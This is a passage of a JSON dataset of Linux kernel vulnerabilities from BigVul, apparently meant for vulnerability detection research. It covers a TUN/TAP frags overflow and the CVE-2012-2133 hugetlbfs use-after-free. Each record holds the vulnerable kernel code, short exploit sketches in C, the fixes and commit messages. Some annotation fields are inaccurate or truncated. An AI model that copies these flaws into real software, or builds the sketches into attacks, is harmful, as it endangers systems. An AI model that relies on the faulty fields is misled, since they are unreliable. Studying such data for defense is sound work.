data_len;\nskb_shinfo(skb)->nr_frags = npages;\nfor (i = 0; i < npages; i++) {\n    struct page *page;\n    page = alloc_pages(sk->sk_allocation, 0);\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nTUN/TAP device interface\n\n[Mandatory] Exploit primitive(s) available:\nHeap-based buffer overflow\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal attackers with TUN/TAP access can trigger overflow by supplying large data_len values that exceed MAX_SKB_FRAGS.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Open TUN/TAP device\n- Create oversized packet with crafted data_len\n- Send packet to trigger overflow\n- May overwrite adjacent heap structures\n- Possible elevation to root privileges\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <linux/if_tun.h>\n#include <fcntl.h>\n\nint main() {\n    int tun_fd = open(\"/dev/net/tun\", O_RDWR);\n    struct ifreq ifr;\n    memset(&ifr, 0, sizeof(ifr));\n    ifr.ifr_flags = IFF_TAP | IFF_NO_PI;\n    ioctl(tun_fd, TUNSETIFF, &ifr);\n\n    // Craft oversized packet\n    char buf[PAGE_SIZE * (MAX_SKB_FRAGS + 1)];\n    write(tun_fd, buf, sizeof(buf));\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nint npages = (data_len + (PAGE_SIZE - 1)) >> PAGE_SHIFT;\n\nerr = -EMSGSIZE;\nif (npages > MAX_SKB_FRAGS)\n    goto failure;\n```\n\n[Mandatory] Fix summary:\nAdded validation to check if npages exceeds MAX_SKB_FRAGS before allocation, returning -EMSGSIZE if invalid.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc\n\n[Optional] Patch Analysis:\nField: PatchType\nAdded bounds check for npages calculation\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other sk_buff allocation functions\n- Check for similar missing bounds checks in network drivers\n- Fuzz TUN/TAP interface with oversized packets\n\n[Optional] Likely variants/impact (one line):\nSimilar missing bounds checks in network packet handling code",
        "tests": "NA",
        "solutions": "struct sk_buff *sock_alloc_send_pskb(struct sock *sk, unsigned long header_len,\n\t\t\t\t     unsigned long data_len, int noblock,\n\t\t\t\t     int *errcode)\n{\n\tstruct sk_buff *skb;\n \tgfp_t gfp_mask;\n \tlong timeo;\n \tint err;\n\tint npages = (data_len + (PAGE_SIZE - 1)) >> PAGE_SHIFT;\n\n\terr = -EMSGSIZE;\n\tif (npages > MAX_SKB_FRAGS)\n\t\tgoto failure;\n \n \tgfp_mask = sk->sk_allocation;\n \tif (gfp_mask & __GFP_WAIT)\n\t\tgfp_mask |= __GFP_REPEAT;\n\n\ttimeo = sock_sndtimeo(sk, noblock);\n\twhile (1) {\n\t\terr = sock_error(sk);\n\t\tif (err != 0)\n\t\t\tgoto failure;\n\n\t\terr = -EPIPE;\n\t\tif (sk->sk_shutdown & SEND_SHUTDOWN)\n\t\t\tgoto failure;\n\n \t\tif (atomic_read(&sk->sk_wmem_alloc) < sk->sk_sndbuf) {\n \t\t\tskb = alloc_skb(header_len, gfp_mask);\n \t\t\tif (skb) {\n \t\t\t\tint i;\n \n \t\t\t\t/* No pages, we're done... */\n \t\t\t\tif (!data_len)\n \t\t\t\t\tbreak;\n \n \t\t\t\tskb->truesize += data_len;\n \t\t\t\tskb_shinfo(skb)->nr_frags = npages;\n \t\t\t\tfor (i = 0; i < npages; i++) {\n\t\t\t\t\tstruct page *page;\n\n\t\t\t\t\tpage = alloc_pages(sk->sk_allocation, 0);\n\t\t\t\t\tif (!page) {\n\t\t\t\t\t\terr = -ENOBUFS;\n\t\t\t\t\t\tskb_shinfo(skb)->nr_frags = i;\n\t\t\t\t\t\tkfree_skb(skb);\n\t\t\t\t\t\tgoto failure;\n\t\t\t\t\t}\n\n\t\t\t\t\t__skb_fill_page_desc(skb, i,\n\t\t\t\t\t\t\tpage, 0,\n\t\t\t\t\t\t\t(data_len >= PAGE_SIZE ?\n\t\t\t\t\t\t\t PAGE_SIZE :\n\t\t\t\t\t\t\t data_len));\n\t\t\t\t\tdata_len -= PAGE_SIZE;\n\t\t\t\t}\n\n\t\t\t\t/* Full success... */\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\terr = -ENOBUFS;\n\t\t\tgoto failure;\n\t\t}\n\t\tset_bit(SOCK_ASYNC_NOSPACE, &sk->sk_socket->flags);\n\t\tset_bit(SOCK_NOSPACE, &sk->sk_socket->flags);\n\t\terr = -EAGAIN;\n\t\tif (!timeo)\n\t\t\tgoto failure;\n\t\tif (signal_pending(current))\n\t\t\tgoto interrupted;\n\t\ttimeo = sock_wait_for_wmem(sk, timeo);\n\t}\n\n\tskb_set_owner_w(skb, sk);\n\treturn skb;\n\ninterrupted:\n\terr = sock_intr_errno(timeo);\nfailure:\n\t*errcode = err;\n\treturn NULL;\n}\n",
        "Publish Date": "2012-08-09",
        "Update Date": "2013-03-01",
        "Vulnerability type": "DoS Overflow +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc",
        "commit_id": "cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc",
        "commit_message": "net: sock: validate data_len before allocating skb in sock_alloc_send_pskb()\n\nWe need to validate the number of pages consumed by data_len, otherwise frags\narray could be overflowed by userspace. So this patch validate data_len and\nreturn -EMSGSIZE when data_len may occupies more frags than MAX_SKB_FRAGS.\n\nSigned-off-by: Jason Wang <jasowang@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2133",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "fs/hugetlbfs/inode.c": "int hugetlb_get_quota(struct address_space *mapping, long delta)\n{\n\tint ret = 0;\n\tstruct hugetlbfs_sb_info *sbinfo = HUGETLBFS_SB(mapping->host->i_sb);\n\tif (sbinfo->free_blocks > -1) {\n\t\tspin_lock(&sbinfo->stat_lock);\n\t\tif (sbinfo->free_blocks - delta >= 0)\n\t\t\tsbinfo->free_blocks -= delta;\n\t\telse\n\t\t\tret = -ENOMEM;\n\t\tspin_unlock(&sbinfo->stat_lock);\n\t}\n\treturn ret;\n}\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2133\n\n[Mandatory] Title: CVE-2012-2133 / CWE-399:\nUse-after-free in Linux kernel hugetlbfs quota handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-03 \u2014 Patch release: 2017-12-28\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.6 (huge pages enabled)\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors\n[Mandatory] Summary:\nA use-after-free vulnerability exists in the Linux kernel's hugetlbfs filesystem quota handling when huge pages are enabled. Local users can trigger improper handling of quota data during umount operations, potentially causing a denial of service (system crash) or privilege escalation. The flaw occurs in the hugetlb_get_quota() function where quota management interacts incorrectly with page handling.\n[Mandatory] Root cause:\nIncorrect reference counting and layering violation in hugetlbfs quota handling leads to potential use-after-free during unmount operations.\n[Mandatory] Attack Surface:\nLocal users interacting with hugetlbfs filesystems\n[Mandatory] Impact Summary:\nLocal DoS or privilege escalation\n[Optional] Trigger / Attack vector:\numount operation on hugetlbfs filesystem\n[Mandatory] Key code/struct excerpt (minimal):\nint hugetlb_get_quota(struct address_space *mapping, long delta)\n{\n    int ret = 0;\n    struct hugetlbfs_sb_info *sbinfo = HUGETLBFS_SB(mapping->host->i_sb);\n    if (sbinfo->free_blocks > -1) {\n        spin_lock(&sbinfo->stat_lock);\n        if (sbinfo->free_blocks - delta >= 0)\n            sbinfo->free_blocks -= delta;\n        else\n            ret = -ENOMEM;\n        spin_unlock(&sbinfo->stat_lock);\n    }\n    return ret;\n}\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nFilesystem operations on hugetlbfs\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free condition\n\n[Mandatory] Exploitability summary (1 sentence):\nControlled by timing unmount operations while the kernel maintains references to freed quota structures.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Set up hugetlbfs filesystem with quota limits\n- Trigger memory operations that maintain references to quota structures\n- Force unmount of filesystem at critical moment\n- Manipulate freed memory structures\n- Gain elevated privileges or crash system\n\n[Mandatory] Exploitation Example script payload code:\nNA\n\nFix\n[Mandatory] Fix code:\nint hugetlb_get_quota(struct address_space *mapping, long delta)\n\n[Mandatory] Fix summary:\nReworked quota handling to use subpools with proper lifetime management instead of direct address_space references.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029\n\n[Optional] Patch Analysis:\nField: PatchType: architectural refactor to proper subpool handling\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other filesystem quota implementations\n- Check reference counting in other hugetlbfs operations\n- Fuzz other hugetlbfs system calls\n\n[Optional] Likely variants/impact (one line):\nSimilar reference counting issues in other filesystem quota handlers",
        "tests": "NA",
        "solutions": "int hugetlb_get_quota(struct address_space *mapping, long delta)\n",
        "Publish Date": "2012-07-03",
        "Update Date": "2017-12-28",
        "Vulnerability type": "DoS +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
        "commit_id": "90481622d75715bfcb68501280a917dbfe516029",
        "commit_message": "hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https://lkml.org/lkml/2011/8/11/28 or\nhttp://marc.info/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2133",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "fs/hugetlbfs/inode.c": "void hugetlb_put_quota(struct address_space *mapping, long delta)\n{\n\tstruct hugetlbfs_sb_info *sbinfo = HUGETLBFS_SB(mapping->host->i_sb);\n\tif (sbinfo->free_blocks > -1) {\n\t\tspin_lock(&sbinfo->stat_lock);\n\t\tsbinfo->free_blocks += delta;\n\t\tspin_unlock(&sbinfo->stat_lock);\n\t}\n}\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2133\n\n[Mandatory] Title: CVE-2012-2133 / CWE-399:\nLinux kernel hugetlbfs use-after-free vulnerability\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-03 \u2014 Patch release: 2017-12-28\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.6 (with huge pages enabled)\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors\n[Mandatory] Summary:\nA use-after-free vulnerability exists in the Linux kernel's hugetlbfs filesystem when handling quota data. Local users can trigger this vulnerability via a umount operation, potentially causing a denial of service (system crash) or privilege escalation. The flaw occurs when free_huge_page() is delayed until after the associated inode has been freed.\n[Mandatory] Root cause:\nImproper handling of quota data when the hugetlbfs filesystem is unmounted, leading to a use-after-free condition.\n[Mandatory] Attack Surface:\nLinux kernel hugetlbfs filesystem interface\n[Mandatory] Impact Summary:\nDoS or potential privilege escalation\n[Optional] Trigger / Attack vector:\numount operation on hugetlbfs filesystem\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nvoid hugetlb_put_quota(struct address_space *mapping, long delta)\n{\n    struct hugetlbfs_sb_info *sbinfo = HUGETLBFS_SB(mapping->host->i_sb);\n    if (sbinfo->free_blocks > -1) {\n        spin_lock(&sbinfo->stat_lock);\n        sbinfo->free_blocks += delta;\n        spin_unlock(&sbinfo->stat_lock);\n    }\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nhugetlbfs filesystem unmount operation\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal attackers can trigger the vulnerability by performing specific operations on hugetlbfs while delaying page freeing.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Mount a hugetlbfs filesystem\n- Perform operations to allocate huge pages\n- Trigger delayed page freeing (e.g., via KVM)\n- Unmount the filesystem to trigger the use-after-free\n- Potentially gain elevated privileges\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <sys/mount.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n\nint main() {\n    // Mount hugetlbfs\n    mount(\"none\", \"/mnt/huge\", \"hugetlbfs\", 0, NULL);\n    \n    // Allocate huge pages (pseudo-code)\n    int fd = open(\"/mnt/huge/file\", O_CREAT|O_RDWR, 0755);\n    \n    // Perform operations to delay page freeing\n    // (Actual exploit would use KVM or other mechanisms)\n    \n    // Unmount to trigger vulnerability\n    umount(\"/mnt/huge\");\n    \n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nvoid hugetlb_put_quota(struct address_space *mapping, long delta)\n```\n\n[Mandatory] Fix summary:\nThe fix introduced the concept of hugepage \"subpools\" to properly manage references and prevent use-after-free conditions.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029\n\n[Optional] Patch Analysis:\nField: PatchType: Reference counting and lifetime management improvement\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other filesystem quota handling code\n- Check for similar delayed free operations in mm subsystem\n- Verify reference counting in all hugepage-related operations\n\n[Optional] Likely variants/impact (one line):\nSimilar issues might exist in other filesystem quota implementations.",
        "tests": "NA",
        "solutions": "void hugetlb_put_quota(struct address_space *mapping, long delta)\n",
        "Publish Date": "2012-07-03",
        "Update Date": "2017-12-28",
        "Vulnerability type": "DoS +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
        "commit_id": "90481622d75715bfcb68501280a917dbfe516029",
        "commit_message": "hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https://lkml.org/lkml/2011/8/11/28 or\nhttp://marc.info/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2133",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "fs/hugetlbfs/inode.c": "hugetlbfs_fill_super(struct super_block *sb, void *data, int silent)\n{\n\tstruct inode * inode;\n\tstruct dentry * root;\n\tint ret;\n\tstruct hugetlbfs_config config;\n\tstruct hugetlbfs_sb_info *sbinfo;\n\n\tsave_mount_options(sb, data);\n\n\tconfig.nr_blocks = -1; /* No limit on size by default */\n\tconfig.nr_inodes = -1; /* No limit on number of inodes by default */\n\tconfig.uid = current_fsuid();\n\tconfig.gid = current_fsgid();\n\tconfig.mode = 0755;\n\tconfig.hstate = &default_hstate;\n\tret = hugetlbfs_parse_options(data, &config);\n\tif (ret)\n\t\treturn ret;\n\n\tsbinfo = kmalloc(sizeof(struct hugetlbfs_sb_info), GFP_KERNEL);\n\tif (!sbinfo)\n\t\treturn -ENOMEM;\n \tsb->s_fs_info = sbinfo;\n \tsbinfo->hstate = config.hstate;\n \tspin_lock_init(&sbinfo->stat_lock);\n\tsbinfo->max_blocks = config.nr_blocks;\n\tsbinfo->free_blocks = config.nr_blocks;\n \tsbinfo->max_inodes = config.nr_inodes;\n \tsbinfo->free_inodes = config.nr_inodes;\n \tsb->s_maxbytes = MAX_LFS_FILESIZE;\n \tsb->s_blocksize = huge_page_size(config.hstate);\n \tsb->s_blocksize_bits = huge_page_shift(config.hstate);\n\tsb->s_magic = HUGETLBFS_MAGIC;\n\tsb->s_op = &hugetlbfs_ops;\n\tsb->s_time_gran = 1;\n\tinode = hugetlbfs_get_root(sb, &config);\n\tif (!inode)\n\t\tgoto out_free;\n\n\troot = d_alloc_root(inode);\n\tif (!root) {\n\t\tiput(inode);\n\t\tgoto out_free;\n\t}\n \tsb->s_root = root;\n \treturn 0;\n out_free:\n \tkfree(sbinfo);\n \treturn -ENOMEM;\n }\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2133\n\n[Mandatory] Title: CVE-2012-2133 / CWE-399:\nLinux kernel hugetlbfs use-after-free\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-03 \u2014 Patch release: 2017-12-28\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.6 with huge pages enabled\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors\nUse-after-free vulnerability in hugetlbfs filesystem\n\n[Mandatory] Summary:\nA use-after-free vulnerability exists in the Linux kernel's hugetlbfs filesystem implementation when huge pages are enabled. Local users can trigger this flaw through filesystem operations like umount, leading to improper handling of quota data. This can result in denial of service (system crash) or potential privilege escalation.\n\n[Mandatory] Root cause:\nImproper lifetime management of quota-related structures during hugetlbfs filesystem operations.\n\n[Mandatory] Attack Surface:\nLocal filesystem operations on hugetlbfs mounts\n\n[Mandatory] Impact Summary:\nLocal privilege escalation or system crash\n\n[Optional] Trigger / Attack vector:\numount operation on hugetlbfs filesystem\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nsbinfo->max_blocks = config.nr_blocks;\nsbinfo->free_blocks = config.nr_blocks;\nsb->s_fs_info = sbinfo;\n...\nout_free:\nkfree(sbinfo);\nreturn -ENOMEM;\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nhugetlbfs filesystem operations (umount)\n\n[Mandatory] Exploit primitive(s) available:\nMemory corruption via use-after-free\n\n[Mandatory] Exploitability summary (1 sentence):\nControlled by local user through filesystem operations, requires hugetlbfs configuration.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Mount hugetlbfs filesystem\n- Perform operations to allocate quota structures\n- Trigger umount at precise timing\n- May lead to memory corruption\n- Potential privilege escalation if structures are controlled\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <sys/mount.h>\n#include <stdio.h>\n\nint main() {\n    // Mount hugetlbfs\n    if (mount(\"none\", \"/mnt/huge\", \"hugetlbfs\", 0, NULL) != 0) {\n        perror(\"mount failed\");\n        return 1;\n    }\n    \n    // Perform operations to allocate quota structures\n    \n    // Trigger umount\n    if (umount(\"/mnt/huge\") != 0) {\n        perror(\"umount failed\");\n        return 1;\n    }\n    \n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nsbinfo->spool = NULL;\nif (config.nr_blocks != -1) {\n    sbinfo->spool = hugepage_new_subpool(config.nr_blocks);\n    if (!sbinfo->spool)\n        goto out_free;\n}\n...\nout_free:\nif (sbinfo->spool)\n    kfree(sbinfo->spool);\nkfree(sbinfo);\nreturn -ENOMEM;\n```\n\n[Mandatory] Fix summary:\nAdded proper subpool management for quota structures with separate lifetime handling and cleanup.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029\n\n[Optional] Patch Analysis:\nField: PatchType - Memory management refactor\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other filesystem quota implementations\n- Check for similar lifetime management issues in other kernel subsystems\n- Audit other hugetlbfs-related memory management\n\n[Optional] Likely variants/impact (one line):\nSimilar use-after-free patterns in other filesystem quota implementations.",
        "tests": "NA",
        "solutions": "hugetlbfs_fill_super(struct super_block *sb, void *data, int silent)\n{\n\tstruct inode * inode;\n\tstruct dentry * root;\n\tint ret;\n\tstruct hugetlbfs_config config;\n\tstruct hugetlbfs_sb_info *sbinfo;\n\n\tsave_mount_options(sb, data);\n\n\tconfig.nr_blocks = -1; /* No limit on size by default */\n\tconfig.nr_inodes = -1; /* No limit on number of inodes by default */\n\tconfig.uid = current_fsuid();\n\tconfig.gid = current_fsgid();\n\tconfig.mode = 0755;\n\tconfig.hstate = &default_hstate;\n\tret = hugetlbfs_parse_options(data, &config);\n\tif (ret)\n\t\treturn ret;\n\n\tsbinfo = kmalloc(sizeof(struct hugetlbfs_sb_info), GFP_KERNEL);\n\tif (!sbinfo)\n\t\treturn -ENOMEM;\n \tsb->s_fs_info = sbinfo;\n \tsbinfo->hstate = config.hstate;\n \tspin_lock_init(&sbinfo->stat_lock);\n \tsbinfo->max_inodes = config.nr_inodes;\n \tsbinfo->free_inodes = config.nr_inodes;\n\tsbinfo->spool = NULL;\n\tif (config.nr_blocks != -1) {\n\t\tsbinfo->spool = hugepage_new_subpool(config.nr_blocks);\n\t\tif (!sbinfo->spool)\n\t\t\tgoto out_free;\n\t}\n \tsb->s_maxbytes = MAX_LFS_FILESIZE;\n \tsb->s_blocksize = huge_page_size(config.hstate);\n \tsb->s_blocksize_bits = huge_page_shift(config.hstate);\n\tsb->s_magic = HUGETLBFS_MAGIC;\n\tsb->s_op = &hugetlbfs_ops;\n\tsb->s_time_gran = 1;\n\tinode = hugetlbfs_get_root(sb, &config);\n\tif (!inode)\n\t\tgoto out_free;\n\n\troot = d_alloc_root(inode);\n\tif (!root) {\n\t\tiput(inode);\n\t\tgoto out_free;\n\t}\n \tsb->s_root = root;\n \treturn 0;\n out_free:\n\tif (sbinfo->spool)\n\t\tkfree(sbinfo->spool);\n \tkfree(sbinfo);\n \treturn -ENOMEM;\n }\n",
        "Publish Date": "2012-07-03",
        "Update Date": "2017-12-28",
        "Vulnerability type": "DoS +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
        "commit_id": "90481622d75715bfcb68501280a917dbfe516029",
        "commit_message": "hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https://lkml.org/lkml/2011/8/11/28 or\nhttp://marc.info/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2133",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
